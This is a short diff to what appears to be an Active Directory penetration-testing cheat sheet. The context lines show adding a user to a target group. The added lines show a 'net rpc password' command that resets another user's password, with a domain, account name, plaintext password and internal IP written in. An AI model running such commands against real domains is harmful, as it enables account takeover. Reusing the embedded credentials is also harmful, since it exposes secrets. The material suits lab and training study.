@@ -215,6 +215,10 @@ Add the user to the target group
 ```
 net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
 ```
+Change Existing user password
+```
+net rpc password "JODIE.SUMMERS" "newP@ssword2022" -U "nara-security.com"/"Tracy.White"%"zqwj041FGX"@ -S "192.168.223.30"
+```
 #### Abusing Active Directory Certificates
 Enumerating vulnerable certificates
 ```
